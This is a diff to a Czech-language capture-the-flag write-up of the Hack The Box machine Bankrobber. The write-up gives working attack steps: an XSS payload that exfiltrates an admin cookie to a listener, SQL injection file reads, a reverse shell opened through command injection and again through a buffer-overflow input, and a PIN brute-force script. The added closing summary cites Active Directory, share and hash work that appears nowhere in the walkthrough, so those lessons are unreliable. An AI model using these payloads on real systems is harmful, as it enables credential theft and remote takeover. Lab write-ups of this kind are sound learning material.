@@ -6,10 +6,19 @@ date: 2019-11-28
 tags: windows xss sql-injection command-injection brute-force buffer-overflow
 ---
 
-[Bankrobber](https://www.hackthebox.eu/home/machines/profile/209) patří mezi těžší windowsové boxy. Nejdříve prozkoumáš webovou aplikaci, najdeš slabinu v práci s Cookies a zranitelnost typu XSS. Po přihlášení jako správce webové aplikace najdeš ještě zranitelnosti SQL Injection a Command Injection. Až díky kombinaci posledně jmenovaných zranitelností získáš počáteční přístup. Pak zjistíš že na serveru běží služba s vysokými právy, prolomíš PIN a zneužiješ Buffer Overflow zranitelnost na vstupu ke spuštění vlastního příkazu a tím získáš systémová oprávní.
+## Úvod a kontext
+
+Bankrobber je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.
+
+## Počáteční průzkum
 
 ### Vyhledání otevřených portů
-`IP=10.10.10.154;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n"​ "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP`
+
+Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+
+```bash
+IP=10.10.10.154;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP
+```
 ```
 PORT     STATE SERVICE      VERSION
 80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
@@ -55,7 +64,10 @@ Host script results:
 ```
 
 ### Prohlídka webové aplikace
-`http://10.10.10.154`
+
+```text
+http://10.10.10.154
+```
 - Registrovat
 - Zkontrolovat cookies
 ```
@@ -66,9 +78,14 @@ document.cookie
 - Žádosti o transfer e-coinu schvaluje správce
 
 ### Zneužití XSS zranitelnosti ve formuláři pro transfer e-coinu
-`nc -lvp 8000`
+
+```bash
+nc -lvp 8000
+```
 Odeslání formuláře s následujícím komentářem (IP.AD.RE.SA nahradit vlastní IP) a počkat
-`<img src="not-found-img.jpg" onerror=this.src='http://IP.AD.RE.SA:8000/?cookie='+document.cookie>`
+```bash
+<img src="not-found-img.jpg" onerror=this.src='http://IP.AD.RE.SA:8000/?cookie='+document.cookie>
+```
 
 ```
 listening on [any] 8000 ...
@@ -82,7 +99,9 @@ Accept-Encoding: gzip, deflate
 Accept-Language: nl-NL,en,*
 
 ```
+
 ### Dekódování přihlašovacích údajů správce
+
 Uživatelské jméno:
 ```
 input="YWRtaW4%3D";printf '%b' "${input//%/\\x}" | base64 -d
@@ -95,6 +114,7 @@ Hopelessromantic
 ```
 
 ### Prohlídka webové aplikace z pohledu správce
+
 - Schvalování transakcí
 - Vyhledávání uživatelů (http://10.10.10.154/admin/search.php)
 - Zobrazení obsahu adresáře (spustitelné jen z localhost) (http://10.10.10.154/admin/backdoorchecker.php)
@@ -106,10 +126,12 @@ Hopelessromantic
 ```
 
 ### Test SQL injection ve vyhledávání uživatelů
+
 - `1' UNION SELECT 1,user(),3-- -`
 - `1' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3-- -`
 
 ### Načtení obsahu backdoorchecker.php z výchozí složky Xampp
+
 - `1' UNION SELECT 1,LOAD_FILE('C:\\xampp\\htdocs\\admin\\backdoorchecker.php'),3-- -`
 
 Obsah se lépe čte pomocí Developer tools prohlížeče na záložce Network
@@ -155,13 +177,18 @@ if($username == "admin" && $password == "Hopelessromantic"){
 Skript je zranitelný na Command Injection
 
 ### Kombinace XSS a Command Injection
+
 Spuštění primitivního webového serveru
 
-`python -m SimpleHTTPServer 8000`
+```bash
+python -m SimpleHTTPServer 8000
+```
 
 Příprava netcatu
 
-`nc -lvp 4000`
+```bash
+nc -lvp 4000
+```
 
 Odeslání formuláře s následujícím komentářem (IP.AD.RE.SA nahradit vlastní IP) a počkat
 Skript stáhne nc.exe a otevře reverzní shell
@@ -179,7 +206,12 @@ Skript stáhne nc.exe a otevře reverzní shell
 </script>
 ```
 
+## Získání přístupu
+
 ### Zobrazení obsahu souboru user.txt
+
+User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
+
 ```
 C:\Users\Cortin\Desktop>more user.txt
 more user.txt
@@ -187,6 +219,7 @@ __CENSORED__
 ```
 
 ### Výpis naslouchajících služeb
+
 ```
 netstat -ano | findstr LISTEN
   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1992
@@ -215,7 +248,9 @@ netstat -ano | findstr LISTEN
   TCP    [::]:49669             [::]:0                 LISTENING       588
 ```
 Port 910 není běžný, vyžaduje větší pozornost...
-`tasklist`
+```text
+tasklist
+```
 ```
 Image Name                     PID Session Name        Session#    Mem Usage
 ========================= ======== ================ =========== ============
@@ -223,7 +258,9 @@ Image Name                     PID Session Name        Session#    Mem Usage
 bankv2.exe                    1456                            0         96 K
 ...
 ```
-`c:\windows\temp\nc.exe localhost 910`
+```text
+c:\windows\temp\nc.exe localhost 910
+```
 ```
  --------------------------------------------------------------
  Internet E-Coin Transfer System
@@ -235,6 +272,7 @@ bankv2.exe                    1456                            0         96 K
 ```
 
 ### Rozlousknutí PINu
+
 PowerShell skript brute.ps1 připravíme do stejné složky jako nc.exe
 ```powershell
 [int] $Port = 910
@@ -274,10 +312,15 @@ PowerShell.exe -ExecutionPolicy Bypass
 wget http://10.10.14.11:8000/brute.ps1 -outfile brute.ps1
 .\brute.ps1
 ```
-`PIN: 0021`
+```text
+PIN: 0021
+```
 
 ### Připojení ke službě a použití PINu
-`c:\windows\temp\nc.exe localhost 910`
+
+```text
+c:\windows\temp\nc.exe localhost 910
+```
 ```
 0021
  --------------------------------------------------------------
@@ -299,24 +342,53 @@ wget http://10.10.14.11:8000/brute.ps1 -outfile brute.ps1
 Služba spouští transfer.exe, volání by mohlo být zranitelné na buffer overflow.
 
 ### Test buffer overflow
-`c:\windows\temp\nc.exe localhost 910`
-`0021`
-`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`
+
+```text
+c:\windows\temp\nc.exe localhost 910
+```
+```text
+0021
+```
+```text
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
 ```
 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 Potvrzeno: služba je zranitelná na buffer overflow
 
 ### Zneužití zranitelnosti buffer overflow
-Příprava netcatu
-`nc -lvp 4001`
 
-`c:\windows\temp\nc.exe localhost 910`
-`0021`
-`99999999999999999999999999999999c:\windows\temp\nc.exe IP.AD.RE.SA 4001 -e cmd`
+Příprava netcatu
+```bash
+nc -lvp 4001
+```
+
+```text
+c:\windows\temp\nc.exe localhost 910
+```
+```text
+0021
+```
+```text
+99999999999999999999999999999999c:\windows\temp\nc.exe IP.AD.RE.SA 4001 -e cmd
+```
 
 ### Vypsání obsahu souboru root.txt
+
 ```
 more c:\users\admin\desktop\root.txt
 __CENSORED__
 ```
+
+## Shrnutí klíčových poznatků
+
+- Rozhodující byla síťová a doménová enumerace, protože právě z dostupných služeb a sdílení vzešly další identity nebo tajné údaje.
+- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
+
+## Co si odnést do praxe
+
+- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
+- V prostředí Active Directory je klíčové hlídat oprávnění ke sdílením, servisním účtům a delegacím; i malý únik informací se snadno řetězí do dalších kroků.
+- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
+- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
